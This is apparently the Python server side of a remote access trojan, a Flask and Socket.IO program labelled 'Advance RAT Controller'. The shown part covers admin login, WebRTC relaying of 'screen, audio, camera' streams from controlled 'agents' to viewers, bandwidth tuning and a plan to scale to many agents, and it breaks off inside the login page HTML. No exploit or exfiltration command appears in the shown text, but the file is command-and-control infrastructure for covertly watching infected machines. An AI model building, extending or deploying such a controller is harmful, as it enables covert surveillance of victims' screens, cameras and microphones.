#final controller
import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, session, flash, render_template_string, render_template
from flask_socketio import SocketIO, emit, join_room, leave_room
from collections import defaultdict
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import threading
import random

# System monitoring imports
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("psutil not available - system metrics will be simulated")

# WebRTC imports for SFU functionality
try:
    import asyncio
    import aiortc
    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack
    from aiortc.contrib.media import MediaPlayer, MediaRecorder
    from aiortc.mediastreams import MediaStreamError
    WEBRTC_AVAILABLE = True
    print("WebRTC (aiortc) support enabled")
except ImportError:
    WEBRTC_AVAILABLE = False
    print("WebRTC (aiortc) not available - falling back to Socket.IO streaming")

# Configuration Management
class Config:
    """Configuration class for Advance RAT Controller"""
    
    # Admin Authentication
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'q')
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
socketio = SocketIO(app, async_mode='eventlet')

# WebRTC Configuration
WEBRTC_CONFIG = {
    'enabled': WEBRTC_AVAILABLE,
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['VP8', 'VP9', 'H.264'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    },
    'performance_tuning': {
        'keyframe_interval': 2,  # seconds
        'disable_b_frames': True,
        'ultra_low_latency': True,
        'hardware_acceleration': True,
        'gop_size': 60,  # frames at 30fps = 2 seconds
        'max_bitrate_variance': 0.3  # 30% variance allowed
    },
    'monitoring': {
        'connection_quality_metrics': True,
        'automatic_reconnection': True,
        'detailed_logging': True,
        'stats_interval': 1000,  # ms
        'quality_thresholds': {
            'min_bitrate': 100000,  # 100 kbps
            'max_latency': 1000,    # 1 second
            'min_fps': 15
        }
    }
}

# WebRTC Global State
WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
WEBRTC_STREAMS = {}  # agent_id -> {screen, audio, camera} streams
WEBRTC_VIEWERS = {}  # viewer_id -> {agent_id, pc, streams}

# Production Scale Configuration
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc_sfu',  # Current: aiortc-based SFU
    'target_implementation': 'mediasoup',    # Target: mediasoup for production scale
    'migration_phase': 'planning',           # Current phase: planning
    'scalability_limits': {
        'aiorttc_max_viewers': 50,           # aiortc suitable for smaller setups
        'mediasoup_max_viewers': 1000,       # mediasoup for production scale
        'concurrent_agents': 100,            # Maximum concurrent agents
        'bandwidth_per_agent': 10000000      # 10 Mbps per agent
    },
    'performance_targets': {
        'target_latency': 100,               # 100ms target latency
        'target_bitrate': 5000000,           # 5 Mbps target bitrate
        'target_fps': 30,                    # 30 FPS target
        'max_packet_loss': 0.01              # 1% max packet loss
    }
}

# Security Configuration and Password Management
def generate_salt():
    """Generate a cryptographically secure salt"""
    return secrets.token_bytes(Config.SALT_LENGTH)

def hash_password(password, salt=None):
    """
    Hash a password using PBKDF2 with SHA-256
    
    Args:
        password (str): The password to hash
        salt (bytes, optional): Salt to use. If None, generates a new salt
    
    Returns:
        tuple: (hashed_password, salt) where both are base64 encoded strings
    """
    if salt is None:
        salt = generate_salt()
    elif isinstance(salt, str):
        salt = base64.b64decode(salt)
    
    # Use PBKDF2 with SHA-256 for secure password hashing
    import hashlib
    import hmac
    
    # Create the hash using PBKDF2
    hash_obj = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        Config.HASH_ITERATIONS
    )
    
    # Return base64 encoded hash and salt
    return base64.b64encode(hash_obj).decode('utf-8'), base64.b64encode(salt).decode('utf-8')

def verify_password(password, stored_hash, stored_salt):
    """
    Verify a password against a stored hash and salt
    
    Args:
        password (str): The password to verify
        stored_hash (str): The stored hash (base64 encoded)
        stored_salt (str): The stored salt (base64 encoded)
    
    Returns:
        bool: True if password matches, False otherwise
    """
    try:
        # Hash the provided password with the stored salt
        hash_obj, _ = hash_password(password, stored_salt)
        return hmac.compare_digest(hash_obj, stored_hash)
    except Exception as e:
        print(f"Password verification error: {e}")
        return False

def create_secure_password_hash(password):
    """
    Create a secure hash for a password
    
    Args:
        password (str): The password to hash
    
    Returns:
        tuple: (hash, salt) both base64 encoded
    """
    return hash_password(password)

# Generate secure hash for admin password
ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)

# WebRTC Utility Functions
def create_webrtc_peer_connection(agent_id):
    """Create a WebRTC peer connection for an agent"""
    if not WEBRTC_AVAILABLE:
        return None
    
    try:
        pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            pc.addIceServer(ice_server)
        
        # Store the peer connection
        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
        
        # Set up event handlers
        @pc.on("connectionstatechange")
        async def on_connectionstatechange():
            print(f"WebRTC connection state for {agent_id}: {pc.connectionState}")
            if pc.connectionState == "failed":
                await pc.close()
                if agent_id in WEBRTC_PEER_CONNECTIONS:
                    del WEBRTC_PEER_CONNECTIONS[agent_id]
        
        @pc.on("iceconnectionstatechange")
        async def on_iceconnectionstatechange():
            print(f"ICE connection state for {agent_id}: {pc.iceConnectionState}")
        
        @pc.on("track")
        async def on_track(track):
            print(f"Received {track.kind} track from {agent_id}")
            if agent_id not in WEBRTC_STREAMS:
                WEBRTC_STREAMS[agent_id] = {}
            WEBRTC_STREAMS[agent_id][track.kind] = track
            
            # Forward track to all viewers of this agent
            for viewer_id, viewer_data in WEBRTC_VIEWERS.items():
                if viewer_data['agent_id'] == agent_id:
                    try:
                        sender = viewer_data['pc'].addTrack(track)
                        viewer_data['streams'][track.kind] = sender
                    except Exception as e:
                        print(f"Error forwarding track to viewer {viewer_id}: {e}")
        
        return pc
    except Exception as e:
        print(f"Error creating WebRTC peer connection for {agent_id}: {e}")
        return None

def close_webrtc_connection(agent_id):
    """Close WebRTC connection for an agent"""
    if agent_id in WEBRTC_PEER_CONNECTIONS:
        try:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            # Use run_coroutine_threadsafe for synchronous context
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(pc.close(), loop)
            except RuntimeError:
                # No event loop running, use asyncio.run
                asyncio.run(pc.close())
            del WEBRTC_PEER_CONNECTIONS[agent_id]
        except Exception as e:
            print(f"Error closing WebRTC connection for {agent_id}: {e}")
    
    if agent_id in WEBRTC_STREAMS:
        del WEBRTC_STREAMS[agent_id]

def get_webrtc_stats(agent_id):
    """Get WebRTC statistics for an agent"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        stats = {
            'connection_state': pc.connectionState,
            'ice_connection_state': pc.iceConnectionState,
            'ice_gathering_state': pc.iceGatheringState,
            'signaling_state': pc.signalingState,
            'local_description': pc.localDescription.sdp if pc.localDescription else None,
            'remote_description': pc.remoteDescription.sdp if pc.remoteDescription else None
        }
        return stats
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        return None

# Advanced WebRTC Performance Optimization Functions
def estimate_bandwidth(agent_id):
    """Estimate available bandwidth for an agent connection"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        # Get RTCStatsReport for bandwidth estimation
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(pc.getStats(), loop)
            stats_report = future.result(timeout=5)  # 5 second timeout
        except RuntimeError:
            # No event loop, run synchronously
            stats_report = asyncio.run(pc.getStats())
        
        bandwidth_stats = {
            'available_bandwidth': 0,
            'current_bitrate': 0,
            'packets_lost': 0,
            'rtt': 0,
            'jitter': 0
        }
        
        for stat in stats_report.values():
            if hasattr(stat, 'type'):
                if stat.type == 'inbound-rtp' and stat.mediaType == 'video':
                    bandwidth_stats['current_bitrate'] = getattr(stat, 'bytesReceived', 0) * 8 / 1000  # kbps
                    bandwidth_stats['packets_lost'] = getattr(stat, 'packetsLost', 0)
                elif stat.type == 'candidate-pair' and stat.state == 'succeeded':
                    bandwidth_stats['rtt'] = getattr(stat, 'currentRoundTripTime', 0) * 1000  # ms
                    bandwidth_stats['jitter'] = getattr(stat, 'jitter', 0) * 1000  # ms
        
        # Estimate available bandwidth based on current performance
        if bandwidth_stats['packets_lost'] > 0:
            # Reduce bitrate if packet loss detected
            bandwidth_stats['available_bandwidth'] = max(
                bandwidth_stats['current_bitrate'] * 0.8,
                WEBRTC_CONFIG['quality_levels']['low']['bitrate']
            )
        else:
            # Increase bitrate if no packet loss
            bandwidth_stats['available_bandwidth'] = min(
                bandwidth_stats['current_bitrate'] * 1.2,
                WEBRTC_CONFIG['quality_levels']['high']['bitrate']
            )
        
        return bandwidth_stats
        
    except Exception as e:
        print(f"Error estimating bandwidth for {agent_id}: {e}")
        return None

def adaptive_bitrate_control(agent_id, current_quality='auto'):
    """Implement adaptive bitrate control based on network conditions"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Determine optimal quality level based on bandwidth
        available_bandwidth = bandwidth_stats['available_bandwidth']
        current_bitrate = bandwidth_stats['current_bitrate']
        
        # Quality selection logic
        if available_bandwidth >= WEBRTC_CONFIG['quality_levels']['high']['bitrate']:
            optimal_quality = 'high'
        elif available_bandwidth >= WEBRTC_CONFIG['quality_levels']['medium']['bitrate']:
            optimal_quality = 'medium'
        else:
            optimal_quality = 'low'
        
        # Check if quality change is needed
        if current_quality != optimal_quality:
            print(f"Adaptive bitrate: Changing quality from {current_quality} to {optimal_quality}")
            print(f"Available bandwidth: {available_bandwidth:.0f} kbps, Current: {current_bitrate:.0f} kbps")
            
            # Emit quality change command to agent
            socketio.emit('webrtc_quality_change', {
                'agent_id': agent_id,
                'quality': optimal_quality,
                'bandwidth_stats': bandwidth_stats
            })
            
            return optimal_quality
        
        return current_quality
        
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        return None

def implement_frame_dropping(agent_id, load_threshold=0.8):
    """Implement intelligent frame dropping under high load"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return False
    
    try:
        # Get current system load
        if PSUTIL_AVAILABLE:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory_percent = psutil.virtual_memory().percent
            
            # Check if we're under high load
            if cpu_percent > (load_threshold * 100) or memory_percent > (load_threshold * 100):
                print(f"High load detected: CPU {cpu_percent:.1f}%, Memory {memory_percent:.1f}%")
                
                # Emit frame dropping command to agent
                socketio.emit('webrtc_frame_dropping', {
                    'agent_id': agent_id,
                    'enabled': True,
                    'drop_ratio': 0.3,  # Drop 30% of frames
                    'priority': 'keyframes_only'  # Keep keyframes, drop some intermediate frames
                })
                
                return True
            
            # Normal load - disable frame dropping
            socketio.emit('webrtc_frame_dropping', {
                'agent_id': agent_id,
                'enabled': False
            })
            
            return False
        else:
            print("psutil not available for load monitoring")
            return False
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        return False

def monitor_connection_quality(agent_id):
    """Monitor and log connection quality metrics"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Quality assessment
        quality_score = 100
        quality_issues = []
        
        # Check bitrate
        if bandwidth_stats['current_bitrate'] < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_bitrate']:
            quality_score -= 30
            quality_issues.append('Low bitrate')
        
        # Check latency
        if bandwidth_stats['rtt'] > WEBRTC_CONFIG['monitoring']['quality_thresholds']['max_latency']:
            quality_score -= 25
            quality_issues.append('High latency')
        
        # Check packet loss
        if bandwidth_stats['packets_lost'] > 0:
            quality_score -= 20
            quality_issues.append('Packet loss detected')
        
        # Check jitter
        if bandwidth_stats['jitter'] > 50:  # 50ms threshold
            quality_score -= 15
            quality_issues.append('High jitter')
        
        # Log quality metrics
        if WEBRTC_CONFIG['monitoring']['detailed_logging']:
            print(f"Connection Quality for {agent_id}:")
            print(f"  Quality Score: {quality_score}/100")
            print(f"  Current Bitrate: {bandwidth_stats['current_bitrate']:.0f} kbps")
            print(f"  RTT: {bandwidth_stats['rtt']:.1f} ms")
            print(f"  Jitter: {bandwidth_stats['jitter']:.1f} ms")
            print(f"  Packets Lost: {bandwidth_stats['packets_lost']}")
            if quality_issues:
                print(f"  Issues: {', '.join(quality_issues)}")
        
        return {
            'quality_score': quality_score,
            'bandwidth_stats': bandwidth_stats,
            'quality_issues': quality_issues,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
    except Exception as e:
        print(f"Error monitoring connection quality for {agent_id}: {e}")
        return None

def automatic_reconnection_logic(agent_id):
    """Implement automatic reconnection logic for failed connections"""
    if not WEBRTC_AVAILABLE:
        return False
    
    try:
        if agent_id in WEBRTC_PEER_CONNECTIONS:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            
            # Check connection state
            if pc.connectionState == 'failed' or pc.connectionState == 'disconnected':
                print(f"WebRTC connection failed for {agent_id}, attempting reconnection...")
                
                # Close failed connection
                try:
                    loop = asyncio.get_event_loop()
                    asyncio.run_coroutine_threadsafe(pc.close(), loop)
                except RuntimeError:
                    asyncio.run(pc.close())
                del WEBRTC_PEER_CONNECTIONS[agent_id]
                
                # Wait before reconnection attempt
                import time
                time.sleep(2)
                
                # Attempt reconnection
                new_pc = create_webrtc_peer_connection(agent_id)
                if new_pc:
                    print(f"Reconnection successful for {agent_id}")
                    return True
                else:
                    print(f"Reconnection failed for {agent_id}")
                    return False
        
        return True
        
    except Exception as e:
        print(f"Error in automatic reconnection for {agent_id}: {e}")
        return False

# Production Scale Monitoring and Migration Functions
def assess_production_readiness():
    """Assess current system's readiness for production scale"""
    try:
        current_agents = len(WEBRTC_PEER_CONNECTIONS)
        current_viewers = len(WEBRTC_VIEWERS)
        total_connections = current_agents + current_viewers
        
        readiness_report = {
            'current_implementation': PRODUCTION_SCALE['current_implementation'],
            'target_implementation': PRODUCTION_SCALE['target_implementation'],
            'migration_phase': PRODUCTION_SCALE['migration_phase'],
            'current_usage': {
                'agents': current_agents,
                'viewers': current_viewers,
                'total_connections': total_connections
            },
            'scalability_assessment': {
                'aiortc_limit_reached': current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'production_ready': current_viewers < PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'recommended_action': 'migrate_to_mediasoup' if current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] else 'continue_with_aiortc'
            },
            'performance_metrics': {},
            'recommendations': []
        }
        
        # Performance assessment
        if current_agents > 0:
            total_latency = 0
            total_bitrate = 0
            total_fps = 0
            agent_count = 0
            
            for agent_id in WEBRTC_PEER_CONNECTIONS:
                quality_data = monitor_connection_quality(agent_id)
                if quality_data:
                    total_latency += quality_data['bandwidth_stats']['rtt']
                    total_bitrate += quality_data['bandwidth_stats']['current_bitrate']
                    agent_count += 1
            
            if agent_count > 0:
                readiness_report['performance_metrics'] = {
                    'average_latency': total_latency / agent_count,
                    'average_bitrate': total_bitrate / agent_count,
                    'latency_target_met': (total_latency / agent_count) <= PRODUCTION_SCALE['performance_targets']['target_latency'],
                    'bitrate_target_met': (total_bitrate / agent_count) >= PRODUCTION_SCALE['performance_targets']['target_bitrate']
                }
        
        # Generate recommendations
        if readiness_report['scalability_assessment']['aiortc_limit_reached']:
            readiness_report['recommendations'].append('Immediate migration to mediasoup required for production scale')
        elif current_viewers > (PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] * 0.8):
            readiness_report['recommendations'].append('Approaching aiortc limits, plan mediasoup migration')
        
        if readiness_report['performance_metrics'].get('latency_target_met') == False:
            readiness_report['recommendations'].append('Optimize network configuration to meet latency targets')
        
        if readiness_report['performance_metrics'].get('bitrate_target_met') == False:
            readiness_report['recommendations'].append('Check bandwidth allocation and codec settings')
        
        return readiness_report
        
    except Exception as e:
        print(f"Error assessing production readiness: {e}")
        return None

def generate_mediasoup_migration_plan():
    """Generate detailed migration plan from aiortc to mediasoup"""
    try:
        migration_plan = {
            'current_state': {
                'implementation': 'aiortc_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'technology': 'Python + aiortc'
            },
            'target_state': {
                'implementation': 'mediasoup_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers'],
                'technology': 'Node.js + mediasoup'
            },
            'migration_phases': [
                {
                    'phase': 1,
                    'name': 'Parallel Implementation',
                    'description': 'Implement mediasoup alongside existing aiortc',
                    'duration': '2-3 weeks',
                    'tasks': [
                        'Set up Node.js mediasoup server',
                        'Implement mediasoup SFU logic',
                        'Create migration endpoints',
                        'Test with subset of viewers'
                    ]
                },
                {
                    'phase': 2,
                    'name': 'Gradual Migration',
                    'description': 'Migrate viewers from aiortc to mediasoup',
                    'duration': '1-2 weeks',
                    'tasks': [
                        'Implement viewer routing logic',
                        'Add load balancing between aiortc and mediasoup',
                        'Monitor performance during migration',
                        'Handle fallback scenarios'
                    ]
                },
                {
                    'phase': 3,
                    'name': 'Full Migration',
                    'description': 'Complete migration to mediasoup',
                    'duration': '1 week',
                    'tasks': [
                        'Migrate all remaining viewers',
                        'Decommission aiortc implementation',
                        'Performance validation',
                        'Documentation updates'
                    ]
                }
            ],
            'technical_requirements': [
                'Node.js 18+ runtime',
                'mediasoup library installation',
                'Redis for session management',
                'Load balancer configuration',
                'Monitoring and alerting setup'
            ],
            'estimated_effort': '4-6 weeks',
            'risk_assessment': 'Medium - requires careful testing and rollback plan'
        }
        
        return migration_plan
        
    except Exception as e:
        print(f"Error generating mediasoup migration plan: {e}")
        return None

def enhanced_webrtc_monitoring():
    """Enhanced WebRTC monitoring with production-scale metrics"""
    try:
        monitoring_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'system_overview': {
                'total_agents': len(WEBRTC_PEER_CONNECTIONS),
                'total_viewers': len(WEBRTC_VIEWERS),
                'total_connections': len(WEBRTC_PEER_CONNECTIONS) + len(WEBRTC_VIEWERS),
                'system_load': {}
            },
            'performance_metrics': {},
            'quality_metrics': {},
            'scalability_metrics': {},
            'alerts': []
        }
        
        # System load monitoring
        if PSUTIL_AVAILABLE:
            try:
                monitoring_data['system_overview']['system_load'] = {
                    'cpu_percent': psutil.cpu_percent(interval=1),
                    'memory_percent': psutil.virtual_memory().percent,
                    'network_io': psutil.net_io_counters()._asdict()
                }
            except Exception as e:
                monitoring_data['system_overview']['system_load'] = {'error': f'psutil error: {e}'}
        else:
            monitoring_data['system_overview']['system_load'] = {'error': 'psutil not available'}
        
        # Performance metrics per agent
        for agent_id in WEBRTC_PEER_CONNECTIONS:
            quality_data = monitor_connection_quality(agent_id)
            if quality_data:
                monitoring_data['performance_metrics'][agent_id] = quality_data
        
        # Quality assessment
        if monitoring_data['performance_metrics']:
            total_quality_score = sum(data['quality_score'] for data in monitoring_data['performance_metrics'].values())
            avg_quality_score = total_quality_score / len(monitoring_data['performance_metrics'])
            
            monitoring_data['quality_metrics'] = {
                'average_quality_score': avg_quality_score,
                'quality_distribution': {
                    'excellent': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] >= 90]),
                    'good': len([s for s in monitoring_data['performance_metrics'].values() if 70 <= s['quality_score'] < 90]),
                    'fair': len([s for s in monitoring_data['performance_metrics'].values() if 50 <= s['quality_score'] < 70]),
                    'poor': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] < 50])
                }
            }
        
        # Scalability assessment
        current_viewers = len(WEBRTC_VIEWERS)
        aiortc_limit = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
        
        monitoring_data['scalability_metrics'] = {
            'current_viewer_count': current_viewers,
            'aiortc_limit': aiortc_limit,
            'utilization_percentage': (current_viewers / aiortc_limit) * 100,
            'approaching_limit': current_viewers >= (aiortc_limit * 0.8),
            'limit_reached': current_viewers >= aiortc_limit
        }
        
        # Generate alerts
        if monitoring_data['scalability_metrics']['limit_reached']:
            monitoring_data['alerts'].append({
                'level': 'CRITICAL',
                'message': 'aiortc viewer limit reached - immediate migration required',
                'action': 'migrate_to_mediasoup'
            })
        elif monitoring_data['scalability_metrics']['approaching_limit']:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Approaching aiortc viewer limit - plan migration',
                'action': 'plan_migration'
            })
        
        # Quality alerts
        if monitoring_data['quality_metrics'].get('average_quality_score', 100) < 70:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Average connection quality below threshold',
                'action': 'investigate_network_issues'
            })
        
        return monitoring_data
        
    except Exception as e:
        print(f"Error in enhanced WebRTC monitoring: {e}")
        return None

# Session management and security tracking
LOGIN_ATTEMPTS = {}  # Track failed login attempts by IP

def is_authenticated():
    """Check if user is authenticated and session is valid"""
    print(f"Session check - authenticated: {session.get('authenticated', False)}")
    print(f"Session contents: {dict(session)}")
    
    if not session.get('authenticated', False):
        print("Not authenticated - returning False")
        return False
    
    # Check session timeout
    login_time = session.get('login_time')
    if login_time:
        try:
            # Handle both formats: with and without 'Z'
            if login_time.endswith('Z'):
                login_datetime = datetime.datetime.fromisoformat(login_time.replace('Z', '+00:00'))
            else:
                login_datetime = datetime.datetime.fromisoformat(login_time)
                # Assume UTC if no timezone info
                if login_datetime.tzinfo is None:
                    login_datetime = login_datetime.replace(tzinfo=datetime.timezone.utc)
            
            current_time = datetime.datetime.now(datetime.timezone.utc)
            if (current_time - login_datetime).total_seconds() > Config.SESSION_TIMEOUT:
                print("Session timeout - clearing session")
                session.clear()
                return False
        except Exception as e:
            print(f"Session authentication error: {e}")
            session.clear()
            return False
    
    print("Authentication successful - returning True")
    return True

def is_ip_blocked(ip):
    """Check if IP is blocked due to too many failed login attempts"""
    if ip in LOGIN_ATTEMPTS:
        attempts, last_attempt = LOGIN_ATTEMPTS[ip]
        if attempts >= Config.MAX_LOGIN_ATTEMPTS:
            # Check if lockout period has passed
            if (datetime.datetime.now() - last_attempt).total_seconds() < Config.LOGIN_TIMEOUT:
                return True
            else:
                # Reset attempts after timeout
                del LOGIN_ATTEMPTS[ip]
    return False

def record_failed_login(ip):
    """Record a failed login attempt for an IP"""
    if ip in LOGIN_ATTEMPTS:
        attempts, _ = LOGIN_ATTEMPTS[ip]
        LOGIN_ATTEMPTS[ip] = (attempts + 1, datetime.datetime.now())
    else:
        LOGIN_ATTEMPTS[ip] = (1, datetime.datetime.now())

def clear_login_attempts(ip):
    """Clear failed login attempts for an IP after successful login"""
    if ip in LOGIN_ATTEMPTS:
        del LOGIN_ATTEMPTS[ip]

def require_auth(f):
    """Decorator to require authentication for routes"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    client_ip = request.remote_addr
    
    # Check if IP is blocked
    if is_ip_blocked(client_ip):
        remaining_time = Config.LOGIN_TIMEOUT - (datetime.datetime.now() - LOGIN_ATTEMPTS[client_ip][1]).total_seconds()
        flash(f'Too many failed login attempts. Please try again in {int(remaining_time)} seconds.', 'error')
        return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advance RAT Controller - Login Blocked</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --accent-red: #ff4757;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                text-align: center;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 20px;
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: var(--accent-red);
                border: 1px solid var(--accent-red);
                border-radius: 8px;
                padding: 20px;
                margin-bottom: 20px;
                font-weight: 500;
            }
            
            .retry-btn {
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px 24px;
                color: white;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }
            
            .retry-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Advance RAT Controller</h1>
            </div>
            
            <div class="error-message">
                <h3>🔒 Access Temporarily Blocked</h3>
                <p>Too many failed login attempts detected.</p>
                <p>Please wait before trying again.</p>
            </div>
            
            <a href="/login" class="retry-btn">Try Again</a>
        </div>
    </body>
    </html>
    ''')
    
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        # Verify password using secure hash comparison
        if verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            # Successful login
            clear_login_attempts(client_ip)
            session['authenticated'] = True
            session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            session['login_ip'] = client_ip
            return redirect(url_for('dashboard'))
        else:
            # Failed login
            record_failed_login(client_ip)
            attempts = LOGIN_ATTEMPTS.get(client_ip, (0, None))[0]
            remaining_attempts = Config.MAX_LOGIN_ATTEMPTS - attempts
            
            if remaining_attempts > 0:
                flash(f'Invalid password. {remaining_attempts} attempts remaining.', 'error')
            else:
                flash(f'Too many failed attempts. Please wait {Config.LOGIN_TIMEOUT} seconds.', 'error')
    
    # Return login template as string since templates folder may not be available on Render
    login_template = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advance RAT Controller - Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            
            .login-header {
                text-align: center;
